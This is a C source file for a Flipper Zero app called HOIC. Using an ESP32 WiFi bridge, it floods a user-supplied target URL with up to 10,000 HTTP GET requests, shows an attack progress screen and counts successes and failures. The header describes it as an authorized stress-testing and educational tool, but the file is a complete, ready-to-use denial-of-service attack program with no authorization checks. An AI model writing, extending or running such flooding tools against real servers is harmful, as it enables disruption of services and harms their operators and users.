/*
 * HOIC (High Orbit Ion Cannon) - Standalone App for Flipped Firmware
 *
 * Network stress testing tool via the ESP32 UART bridge.
 * Sends rapid HTTP requests to a target URL to test server resilience.
 * Requires ESP32 WiFi dev board connected via GPIO UART.
 *
 * For authorized security testing and educational purposes only.
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_box.h>
#include <gui/modules/text_input.h>
#include <notification/notification_messages.h>
#include <storage/storage.h>
#include <furi_hal_serial.h>

#define UART_CH FuriHalSerialIdUsart
#define UART_BAUD 115200
#define RX_BUF_SIZE 512
#define OUTPUT_BUF_SIZE 4000
#define URL_MAX_LEN 256
#define THREADS_MAX 10

typedef enum {
    ViewMenu,
    ViewOutput,
    ViewUrlInput,
    ViewCountInput,
} AppView;

typedef enum {
    AttackIdle,
    AttackRunning,
    AttackDone,
} AttackState;

typedef struct {
    FuriHalSerialHandle* serial;
    FuriStreamBuffer* rx_stream;
    bool detected;
    bool connected;
} WifiModule;

typedef struct {
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    TextBox* text_box;
    TextInput* text_input;
    Gui* gui;
    Storage* storage;
    NotificationApp* notification;

    WifiModule wifi;

    char output_buf[OUTPUT_BUF_SIZE];
    size_t output_len;

    char target_url[URL_MAX_LEN];
    char count_str[8];
    int request_count;
    int successful;
    int failed;
    AttackState state;
    bool stop_requested;
    FuriThread* attack_thread;
} HoicApp;

/* ── UART helpers ── */

static void uart_rx_callback(
    FuriHalSerialHandle* handle,
    FuriHalSerialRxEvent event,
    void* context) {
    UNUSED(handle);
    HoicApp* app = context;
    if(event == FuriHalSerialRxEventData) {
        uint8_t byte = furi_hal_serial_async_rx(app->wifi.serial);
        furi_stream_buffer_send(app->wifi.rx_stream, &byte, 1, 0);
    }
}

static void wifi_init(HoicApp* app) {
    app->wifi.rx_stream = furi_stream_buffer_alloc(RX_BUF_SIZE, 1);
    app->wifi.serial = furi_hal_serial_control_acquire(UART_CH);
    furi_hal_serial_init(app->wifi.serial, UART_BAUD);
    furi_hal_serial_async_rx_start(app->wifi.serial, uart_rx_callback, app, false);
    app->wifi.detected = false;
    app->wifi.connected = false;
}

static void wifi_deinit(HoicApp* app) {
    furi_hal_serial_async_rx_stop(app->wifi.serial);
    furi_hal_serial_deinit(app->wifi.serial);
    furi_hal_serial_control_release(app->wifi.serial);
    furi_stream_buffer_free(app->wifi.rx_stream);
}

static void wifi_send(HoicApp* app, const char* cmd) {
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)cmd, strlen(cmd));
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)"\r\n", 2);
}

static bool wifi_recv_line(HoicApp* app, char* buf, size_t buf_size, uint32_t timeout_ms) {
    size_t pos = 0;
    uint32_t start = furi_get_tick();
    while(furi_get_tick() - start < timeout_ms) {
        uint8_t byte;
        if(furi_stream_buffer_receive(app->wifi.rx_stream, &byte, 1, 10) == 1) {
            if(byte == '\n') {
                if(pos > 0 && buf[pos - 1] == '\r') pos--;
                buf[pos] = '\0';
                return true;
            }
            if(pos < buf_size - 1) {
                buf[pos++] = (char)byte;
            }
        }
    }
    buf[pos] = '\0';
    return pos > 0;
}

static bool wifi_detect(HoicApp* app) {
    uint8_t tmp;
    while(furi_stream_buffer_receive(app->wifi.rx_stream, &tmp, 1, 0) == 1) {}

    wifi_send(app, "AT");
    char resp[32];
    if(wifi_recv_line(app, resp, sizeof(resp), 500)) {
        if(strcmp(resp, "OK") == 0) {
            app->wifi.detected = true;
            /* Check WiFi status */
            wifi_send(app, "WIFI_STATUS");
            if(wifi_recv_line(app, resp, sizeof(resp), 1000)) {
                app->wifi.connected = (strcmp(resp, "CONNECTED") == 0);
            }
            return true;
        }
    }
    app->wifi.detected = false;
    return false;
}

/* ── Output helpers ── */

static void output_clear(HoicApp* app) {
    app->output_buf[0] = '\0';
    app->output_len = 0;
}

static void output_append(HoicApp* app, const char* text) {
    size_t tlen = strlen(text);
    if(app->output_len + tlen >= OUTPUT_BUF_SIZE - 1) {
        size_t keep = OUTPUT_BUF_SIZE / 2;
        size_t start = app->output_len - keep;
        memmove(app->output_buf, app->output_buf + start, keep);
        app->output_len = keep;
        app->output_buf[app->output_len] = '\0';
    }
    memcpy(app->output_buf + app->output_len, text, tlen);
    app->output_len += tlen;
    app->output_buf[app->output_len] = '\0';
}

static void output_refresh(HoicApp* app) {
    text_box_set_text(app->text_box, app->output_buf);
    text_box_set_focus(app->text_box, TextBoxFocusEnd);
}

/* ── Attack worker thread ── */

static int32_t attack_worker(void* context) {
    HoicApp* app = context;
    app->successful = 0;
    app->failed = 0;

    char cmd[300];
    char resp[256];

    for(int i = 0; i < app->request_count && !app->stop_requested; i++) {
        /* Use DOWNLOAD command to make HTTP GET requests.
           We don't care about the response data, just the status. */
        snprintf(cmd, sizeof(cmd), "DOWNLOAD %s", app->target_url);

        /* Flush rx buffer */
        uint8_t tmp;
        while(furi_stream_buffer_receive(app->wifi.rx_stream, &tmp, 1, 0) == 1) {}

        wifi_send(app, cmd);

        /* Read response - either SIZE:xxx or ERROR:xxx */
        if(wifi_recv_line(app, resp, sizeof(resp), 10000)) {
            if(strncmp(resp, "SIZE:", 5) == 0) {
                app->successful++;
                /* Drain the data and DONE marker */
                int size = atoi(resp + 5);
                int drained = 0;
                while(drained < size) {
                    uint8_t drain_buf[256];
                    int to_drain = size - drained;
                    if(to_drain > (int)sizeof(drain_buf)) to_drain = (int)sizeof(drain_buf);
                    size_t got = furi_stream_buffer_receive(
                        app->wifi.rx_stream, drain_buf, to_drain, 5000);
                    if(got == 0) break;
                    drained += got;
                }
                /* Read DONE line */
                wifi_recv_line(app, resp, sizeof(resp), 2000);
            } else if(strncmp(resp, "ERROR:", 6) == 0) {
                app->failed++;
            } else {
                app->failed++;
            }
        } else {
            app->failed++;
        }

        /* Update display every 5 requests */
        if((i + 1) % 5 == 0 || i == app->request_count - 1) {
            char status[256];
            snprintf(
                status,
                sizeof(status),
                "HOIC Attack Running\n"
                "Target: %s\n\n"
                "Progress: %d/%d\n"
                "Success: %d | Failed: %d\n",
                app->target_url,
                i + 1,
                app->request_count,
                app->successful,
                app->failed);
            output_clear(app);
            output_append(app, status);
            output_refresh(app);
        }

        /* Small delay between requests */
        furi_delay_ms(50);
    }

    /* Final status */
    char final_status[256];
    snprintf(
        final_status,
        sizeof(final_status),
        "HOIC Attack Complete\n"
        "Target: %s\n\n"
        "Total: %d requests\n"
        "Success: %d | Failed: %d\n"
        "\nPress Back to return.\n",
        app->target_url,
        app->successful + app->failed,
        app->successful,
        app->failed);
    output_clear(app);
    output_append(app, final_status);
    output_refresh(app);

    app->state = AttackDone;
    return 0;
}

/* ── Callbacks ── */

static uint32_t nav_exit(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static uint32_t nav_menu(void* context) {
    UNUSED(context);
    return ViewMenu;
}

static void count_input_done(void* context);

static void url_input_done(void* context) {
    HoicApp* app = context;

    /* Now ask for request count */
    text_input_reset(app->text_input);
    text_input_set_header_text(app->text_input, "Number of requests:");
    memset(app->count_str, 0, sizeof(app->count_str));
    strncpy(app->count_str, "100", sizeof(app->count_str) - 1);
    text_input_set_result_callback(
        app->text_input,
        count_input_done,
        app,
        app->count_str,
        sizeof(app->count_str),
        true);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewCountInput);
}

static void count_input_done(void* context) {
    HoicApp* app = context;

    app->request_count = atoi(app->count_str);
    if(app->request_count <= 0) app->request_count = 100;
    if(app->request_count > 10000) app->request_count = 10000;

    app->stop_requested = false;
    app->state = AttackRunning;

    output_clear(app);
    output_append(app, "HOIC Attack Starting...\n");
    output_append(app, "Target: ");
    output_append(app, app->target_url);
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "\nRequests: %d\n\n", app->request_count);
    output_append(app, tmp);
    output_refresh(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);

    /* Launch attack thread */
    app->attack_thread = furi_thread_alloc_ex("hoic_worker", 4096, attack_worker, app);
    furi_thread_start(app->attack_thread);
}

typedef enum {
    MenuStartAttack,
    MenuWifiStatus,
} MenuItemId;

static void menu_callback(void* context, uint32_t index) {
    HoicApp* app = context;

    if(!app->wifi.detected) {
        output_clear(app);
        output_append(app, "No WiFi module detected!\nConnect ESP32 via UART.\n");
        output_refresh(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
        return;
    }

    if(index == MenuWifiStatus) {
        output_clear(app);
        wifi_send(app, "WIFI_STATUS");
        char resp[64];
        if(wifi_recv_line(app, resp, sizeof(resp), 1000)) {
            output_append(app, "WiFi Status: ");
            output_append(app, resp);
            output_append(app, "\n");
        } else {
            output_append(app, "No response from module.\n");
        }
        output_refresh(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
        return;
    }

    if(index == MenuStartAttack) {
        if(!app->wifi.connected) {
            /* Check again */
            wifi_send(app, "WIFI_STATUS");
            char resp[64];
            if(wifi_recv_line(app, resp, sizeof(resp), 1000)) {
                app->wifi.connected = (strcmp(resp, "CONNECTED") == 0);
            }
            if(!app->wifi.connected) {
                output_clear(app);
                output_append(app, "WiFi not connected!\n");
                output_append(app, "Connect via Terminal app first.\n");
                output_refresh(app);
                view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
                return;
            }
        }

        /* Get target URL */
        text_input_reset(app->text_input);
        text_input_set_header_text(app->text_input, "Target URL:");
        memset(app->target_url, 0, sizeof(app->target_url));
        text_input_set_result_callback(
            app->text_input,
            url_input_done,
            app,
            app->target_url,
            URL_MAX_LEN,
            true);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewUrlInput);
        return;
    }
}

/* ── App lifecycle ── */

static HoicApp* app_alloc(void) {
    HoicApp* app = malloc(sizeof(HoicApp));
    memset(app, 0, sizeof(HoicApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->storage = furi_record_open(RECORD_STORAGE);
    app->notification = furi_record_open(RECORD_NOTIFICATION);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    /* Menu */
    app->submenu = submenu_alloc();
    view_set_previous_callback(submenu_get_view(app->submenu), nav_exit);
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu, submenu_get_view(app->submenu));

    /* TextBox output */
    app->text_box = text_box_alloc();
    text_box_set_font(app->text_box, TextBoxFontText);
    view_set_previous_callback(text_box_get_view(app->text_box), nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewOutput, text_box_get_view(app->text_box));

    /* TextInput for URL */
    app->text_input = text_input_alloc();
    view_set_previous_callback(text_input_get_view(app->text_input), nav_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewUrlInput, text_input_get_view(app->text_input));

    /* Reuse text_input for count - same view ID trick won't work,
       so we use a single text_input and switch context */
    view_dispatcher_add_view(
        app->view_dispatcher, ViewCountInput, text_input_get_view(app->text_input));

    return app;
}

static void app_free(HoicApp* app) {
    if(app->attack_thread) {
        app->stop_requested = true;
        furi_thread_join(app->attack_thread);
        furi_thread_free(app->attack_thread);
    }

    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewOutput);
    view_dispatcher_remove_view(app->view_dispatcher, ViewUrlInput);
    view_dispatcher_remove_view(app->view_dispatcher, ViewCountInput);

    submenu_free(app->submenu);
    text_box_free(app->text_box);
    text_input_free(app->text_input);

    wifi_deinit(app);

    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_STORAGE);
    furi_record_close(RECORD_NOTIFICATION);

    free(app);
}

int32_t hoic_app(void* p) {
    UNUSED(p);
    HoicApp* app = app_alloc();
    wifi_init(app);
    wifi_detect(app);

    submenu_reset(app->submenu);
    if(app->wifi.detected) {
        submenu_add_item(app->submenu, "Start Attack", MenuStartAttack, menu_callback, app);
        submenu_add_item(app->submenu, "WiFi Status", MenuWifiStatus, menu_callback, app);
    } else {
        submenu_add_item(app->submenu, "[No WiFi Module]", MenuStartAttack, menu_callback, app);
        submenu_add_item(app->submenu, "WiFi Status", MenuWifiStatus, menu_callback, app);
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);

    app_free(app);
    return 0;
}
